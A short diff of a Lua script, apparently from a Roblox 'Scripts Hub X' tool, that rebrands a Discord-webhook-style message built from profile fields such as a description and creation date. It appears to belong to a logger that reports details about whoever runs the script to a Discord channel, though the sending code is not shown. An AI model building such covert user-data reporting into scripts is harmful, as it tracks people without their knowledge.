@@ -369,12 +369,12 @@ coroutine.wrap(function()
                     local DescriptionData = json.description
                     local CreatedData = json.created
                     local send_data = {
-                        ["username"] = "Jumpscare Notify",
+                        ["username"] = "Anti Information Leaks",
                         ["avatar_url"] = "https://res.cloudinary.com/dtjjgiitl/image/upload/q_auto:good,f_auto,fl_progressive/v1753332266/kpjl5smuuixc5w2ehn7r.jpg",
-                        ["content"] = "Jeff Wuz Here !",
+                        ["content"] = "https://discord.gg/bpsNUH5sVb",
                         ["embeds"] = {
                             {
-                                ["title"] = "Jeff's Log",
+                                ["title"] = "Scripts Hub X | Official - Protection",
                                 ["description"] = "THIS IS PROBIHIDENED BY Scripts Hub X | Official",
                                 ["color"] = 4915083,
                                 ["fields"] = {
